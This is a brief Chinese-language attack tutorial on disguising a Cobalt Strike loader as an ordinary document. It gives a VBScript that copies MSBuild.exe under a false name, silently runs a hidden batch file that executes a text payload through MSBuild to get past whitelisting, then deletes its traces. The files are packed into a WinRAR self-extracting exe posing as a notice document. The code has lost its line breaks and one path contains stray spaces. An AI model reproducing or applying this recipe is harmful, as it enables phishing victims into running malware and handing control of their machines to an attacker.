0x01 准备好需要伪装的文档




0x02 准备MSBuild白名单执行文件，写入txt


0x03 写一个VBS拷贝隐藏文件，代码如下：   

On Error Resume NextDIM objShellSet objShell=wscript.createObject("wscript.shell")Set fso=CreateObject("Scripting.FileSystemObject")fso.CopyFile"C:\Windows\Microsoft.NET\Framework64\v4.0.30319         \MSBuild.exe","E:\systems.exe"fso.CopyFile"3h.bat","E:\3h.bat"fso.CopyFile"3h.txt","E:\3h"fso.deletefile "关于2020XXXXX的通知.exe"fso.CopyFile"3h.vbs","E:\3h.vbs"iReturn=objShell.Run("E:\3h.bat",0)WScript.Sleep 3000fso.deletefile "E:\3h"fso.deletefile "E:\3h.vbs"fso.deletefile "E:\3h.bat"fso.deletefile "E:\systems.exe"

0x04 使用bat白名单执行

@echo offpath = E:\;E:\systems.exe E:\3hpause


0x05 用winrar打包成自解压文件，将除文档的其他文件设置为隐藏文件

0x06 最终生成一个exe伪装文档，使用后会变为普通docx文档，cs成功上线
